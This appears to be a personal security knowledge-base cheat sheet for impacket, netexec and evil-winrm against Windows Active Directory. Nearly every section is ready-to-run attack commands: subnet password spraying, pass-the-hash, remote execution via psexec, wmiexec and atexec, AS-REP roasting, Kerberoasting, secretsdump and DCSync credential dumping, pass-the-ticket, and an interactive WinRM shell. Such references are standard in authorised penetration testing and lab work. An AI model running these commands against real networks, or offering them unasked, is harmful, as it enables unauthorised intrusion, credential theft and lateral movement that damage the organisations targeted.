---
summary: impacket + netexec (nxc) — SMB/AD/Kerberos toolkit, remote exec, spraying, secretsdump.
status: active
tags: [security, tools, impacket, active-directory]
private: false
---

# impacket & netexec

The Windows/AD workhorses from Linux. **netexec** (`nxc`, the maintained CrackMapExec fork) sweeps and sprays; **impacket** scripts do targeted exec, Kerberos, and dumping.

## netexec (nxc) — enumerate & spray

```bash
nxc smb $IP                                  # host/domain/signing info
nxc smb $IP -u '' -p ''                       # null session
nxc smb $CIDR -u user -p pass                 # spray a cred across a subnet
nxc smb $IP -u user -H <NTLM>                 # pass-the-hash
nxc smb $IP -u user -p pass --shares --users --pass-pol --sam --lsa
nxc winrm $IP -u user -p pass                 # find WinRM (5985) admin
nxc ldap $DC -u user -p pass --bloodhound -c all
```

`+` before a host in output = valid creds; `(Pwn3d!)` = admin.

## impacket — exec (with password or `-hashes :NTLM`)

```bash
impacket-psexec  corp/user@$IP               # SYSTEM, noisy (creates a service)
impacket-wmiexec corp/user@$IP -hashes :<NTLM>   # semi-interactive, quiet
impacket-smbexec corp/user@$IP               # no file drop
impacket-atexec  corp/user@$IP '<cmd>'       # scheduled-task exec
```

## impacket — Kerberos & dumping

```bash
impacket-GetNPUsers corp/ -usersfile users.txt -no-pass -dc-ip $DC   # AS-REP roast
impacket-GetUserSPNs corp/user:pass -dc-ip $DC -request              # Kerberoast
impacket-secretsdump corp/user:pass@$IP                              # SAM/LSA/creds
impacket-secretsdump corp/user@$DC -just-dc -hashes :<NTLM>          # DCSync
impacket-getTGT corp/user -hashes :<NTLM>; export KRB5CCNAME=user.ccache   # PtT
```

## evil-winrm (interactive WinRM shell)

```bash
evil-winrm -i $IP -u user -p pass            # or -H <NTLM>
```

## Related

- [impacket tool index](kb://11-security-tools-tools-index)
- [Active Directory](kb://11-security-playbook-active-directory)
- [BloodHound](kb://11-security-tools-bloodhound)
